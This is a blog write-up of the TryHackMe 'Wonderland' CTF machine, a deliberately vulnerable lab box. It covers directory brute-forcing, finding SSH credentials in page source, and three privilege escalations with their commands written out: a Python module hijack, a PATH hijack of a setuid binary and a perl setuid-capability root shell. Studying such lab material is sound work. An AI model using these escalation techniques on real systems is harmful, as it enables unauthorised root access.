---
layout: post
title: TryHackMe Wonderland write up
---


![wonderland](https://raw.githubusercontent.com/barryclark/jekyll-now/526bd72a4b420ec05d1726b8ce81696a440af58f/assets/thm/wonder/wonderland.jpeg)

### about the machine
this is a medium rated machine from wonderland series, which happens to be the first series I try to get root on

### Reconnaissance

first thing I did is adding the box ip to my hosts file
```bash
echo "10.10.114.141 ctf.thm" | sudo tee -a /etc/hosts
```
running a quick nmap scan on the machine tells me that there are 2 running services on the box 

```bash
# Nmap 7.60SVN scan initiated Fri Jan  1 22:47:40 2021 as: nmap -v -oN ports ctf.thm
Nmap scan report for ctf.thm (10.10.114.141)
Host is up (0.39s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/local/bin/../share/nmap
# Nmap done at Fri Jan  1 22:51:48 2021 -- 1 IP address (1 host up) scanned in 247.56 seconds
```

so I ran a detailed scan on those 2 ports 
```bash
# Nmap 7.60SVN scan initiated Fri Jan  1 22:53:05 2021 as: nmap -v -p 80,22 -sC -sV -oN detailed_scan ctf.thm
Nmap scan report for ctf.thm (10.10.114.141)
Host is up (0.57s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  1 22:53:34 2021 -- 1 IP address (1 host up) scanned in 28.59 seconds
```
nothing out of the ordinary here, and the ssh version seems to be secure

usally when I find an authentication service running on these types of CTFs I run nmap with bruteforce nse scripts in the background to get the root password, or as soon as I get a potentiel user, sometimes it works, this time it didn't

running a full ports scan with nmap doesn't give any interesting results


### http service enumeration

we have a static page without any usefull information, or so I thought, because as it will turn out later, it has the first flag
![index_page](https://raw.githubusercontent.com/barryclark/jekyll-now/526bd72a4b420ec05d1726b8ce81696a440af58f/assets/thm/wonder/index_page.png)

the next thing I did was running a directory-bruteforce which revealed 3 directories
```bash
$ gobuster dir -u ctf.thm -w  $WORDLISTS/raft-small-directories-lowercase.txt -t 30
/img (Status: 301)
/r (Status: 301)
/poem (Status: 301)
```
`/img` didn't had anything useful for us

`/poem` had the following a poem written on it, as useful as /img was

but the `/r` directory had a quote on it that encouraged me to keep searching for subdirectories there

![r_directory](https://raw.githubusercontent.com/barryclark/jekyll-now/526bd72a4b420ec05d1726b8ce81696a440af58f/assets/thm/wonder/r_directory.png)

the name 'r' seemed a bit strange to me since it was a one-letter directory, so to make the bruteforce process quicker I made a wordlist that contains only single letters and used it to bruteforce other directories under `ctf.thm` and subdirectories under `ctf.thm/r/` and it worked

```bash
$ for i in {a..z}; do echo $i >> word; done
$ for i in {A..Z}; do echo $i >> word; done
$ gobuster dir -u http://10.10.114.141/r/ -w word
/a (Status: 301)
```
at this point I knew there was a `ctf.thm/r/a/b/b/i/t` path, and with each letter I got a static pages telling me I was on the right path with no additional info, except for the last page which had a picture hinting there is something hidden in there

![hidden creds](https://raw.githubusercontent.com/barryclark/jekyll-now/526bd72a4b420ec05d1726b8ce81696a440af58f/assets/thm/wonder/something_hidden.png)

examining the source code showed what appeared to be the ssh credentiels for the user `alice`

![ssh creds](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/wonder/creds.png)

### \[hacker voice\] I'm in

once I got on the box, I found a file called `root.txt` which has the final flag we have to find, this seemed a bit weird since I haven't found the `user.txt` flag yet.

after doing some enumeration I found a that I can execute a python script as another user, I didn't have the the permissions to edit it thought

```bash
$ ssh alice@10.10.114.141
The authenticity of host '10.10.114.141 (10.10.114.141)' can't be established.
ECDSA key fingerprint is 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.213.60' (ECDSA) to the list of known hosts.
alice@10.10.213.60's password: 

$ alice@wonderland:~$ ls -lha
total 40K
drwxr-xr-x 5 alice alice 4.0K May 25  2020 .
drwxr-xr-x 6 root  root  4.0K May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3.7K May 25  2020 .bashrc
drwx------ 2 alice alice 4.0K May 25  2020 .cache
drwx------ 3 alice alice 4.0K May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4.0K May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3.5K May 25  2020 walrus_and_the_carpenter.py
$ alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
$ alice@wonderland:~$ uname -a
Linux wonderland 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

the script has the same poem we saw earlier on the website, sliced up to 10 parts. and its functionality was to print a random part from them, oh and it also included the library `random`

```python
import random
poem = """The sun was shining on the sea,
Shining with all his mig
...
"""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)

```

I didn't have a clue how to exploit this so I just continued my enumeration, looking up the kernel version led me to try CVE-018-18955 on the box, which kind of gave me a "root prompt" but without any special priveleges, and I have no clue why

I took a step back and tried finding the `user.txt` flag, I ran couple `find` commands but nothing came up, I started running out of ideas till I viewed the hint on the website

![upside down](https://raw.githubusercontent.com/barryclark/jekyll-now/526bd72a4b420ec05d1726b8ce81696a440af58f/assets/thm/wonder/upside_down.png)

I went to check the root directory and surprise surprise, we have execute permissions on it. this means we can't list the files on `/root` but we can run commands or read files from there as long as we know the names of the files, lucky for me, tryhackme tells me to > Obtain the flag in user.txt

```bash
alice@wonderland:~$ ls -lhd /root
drwx--x--x 4 root root 4.0K May 25  2020 /root
alice@wonderland:~$ ls /root
ls: cannot open directory '/root': Permission denied
alice@wonderland:~$ cat /root/user.txt
thm{"REDACTED FLAG"}
alice@wonderland:~$
```
### escalating to rabbit

examining `/etc/passwd` tells me that there 4 regular users on the box

```bash
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
```
I already know I can execute a script as the user `rabbit` but didn't know that to do with that information, and with of lot of time passed enumerationng, I decided to peak at a write up, but hey let's keep that between me and you

doing so I've learned 2 new things
<ul>
    <li> you can execute commands as another user using `sudo -u USER COMMAND` </li>
    <li> python tries to find imported libraries in the current working directory before looking for them somewhere else, knowing this we can make a malicious `random.py` to elevate priveleges </li>
</ul>
   

of course, it's so obvious, *if* I had known those informations before

```bash
alice@wonderland:~$ echo 'import pty;pty.spawn("/bin/bash")' > random.py
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 
[sudo] password for alice: 
rabbit@wonderland:~$ whoami
rabbit
rabbit@wonderland:~$
```

### escalating to hatter

checking out what in rabbit's home directory I found a 64 bit elf executable with both setuid and setgid bits set, this was pleasant to see as my reverese engineering skills are slightly better than my web hacking skills

```bash
rabbit@wonderland:~$ cd ../rabbit/
rabbit@wonderland:/home/rabbit$ ls -lah
total 40K
drwxr-x--- 2 rabbit rabbit 4.0K May 25  2020 .
drwxr-xr-x 6 root   root   4.0K May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit  220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit 3.7K May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit  807 May 25  2020 .profile
-rwsr-sr-x 1 root   root    17K May 25  2020 teaParty
rabbit@wonderland:/home/rabbit$ file teaParty 
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
rabbit@wonderland:/home/rabbit$
```

after downloading the binary and opening it with binaryninja, I was able to recover the source code (you can find it [here](https://github.com/0x00Jeff/reversed_binaries/blob/master/tryhackme/teaParty.c))

TLDR; it sets the effective user and group id to 1003, which belong the `hatter`, this way we can spawn a shell as that user, it then prints some stuff and executes the following `bash` command using `system(3)` function

```bash
/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R
```
you can see that `date` wasn't invoked with its absolute path, knowing this, we can make a fake `date` executable then alter the `$PATH` variable so the teaParty executes our version of the said executable

```bash
rabbit@wonderland:/home/rabbit$ cd ../rabbit/
rabbit@wonderland:/home/rabbit$ echo "bash -p" > date
rabbit@wonderland:/home/rabbit$ chmod +x date 
rabbit@wonderland:/home/rabbit$ export PATH="$PWD:$PATH"
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ whoami
hatter
hatter@wonderland:/home/rabbit$
```

### gaining root privileges

`hatter`'s home directory didn't have anything useful for us, there was a file there that contains some kind of password, I tried using it to login as `root`
without any success, after a while it turned out to be `hatter`'s ssh credentiels, it didn't do me any good as `hatter` didn't have the permission to execute commands with sudo

```bash
hatter@wonderland:/home/rabbit$ cd ../hatter/
hatter@wonderland:/home/hatter$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .local  .profile  password.txt
hatter@wonderland:/home/hatter$ cat password.txt 
[REDACTED PASSWRD]
hatter@wonderland:/home/hatter$ sudo -l
[sudo] password for hatter: 
Sorry, user hatter may not run sudo on wonderland.
hatter@wonderland:/home/hatter$
```

at this point I've been enumerating for quite some time but I hit a wall for the second time, couple hours passsed and I've decided to peak at a write up again, I found out that I should look for files with `capabilities(7)`, again something little obvious. but I probably wouldn't have known it since even tho I always heard of such things, I never interacted or took the time to get familliar with them

after some digging around I found a utlity called `getccap` that can display files with special capabilites, you can read it's man page to know more about it

```bash
hatter@wonderland:/home/hatter$ getcap -r / 2> /dev/null 
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep 
hatter@wonderland:/home/hatter$ ls -lh /usr/bin/perl5.26.1 /usr/bin/perl
-rwxr-xr-- 2 root hatter 2.1M Nov 19  2018 /usr/bin/perl
-rwxr-xr-- 2 root hatter 2.1M Nov 19  2018 /usr/bin/perl5.26.1
```

after looking up those executables in [gtfo bins](https://gtfobins.github.io/) I found a command I can use to spawn a root shell, and it worked on both binaries!

```bash
hatter@wonderland:~$ /usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root
# 
```

### I'm groot

now that I'm root we can just get the `root.txt` flag

```bash
# cat /home/alice/root.txt
thm{REDACTED}
# 
```

### conclusion

wonderland was a really nice box, it had me banging my head against the wall couple times but I learned some new tricks that will probably come handy in the future, I hope you did as well, hopefully next time there would be less to no peaking at all
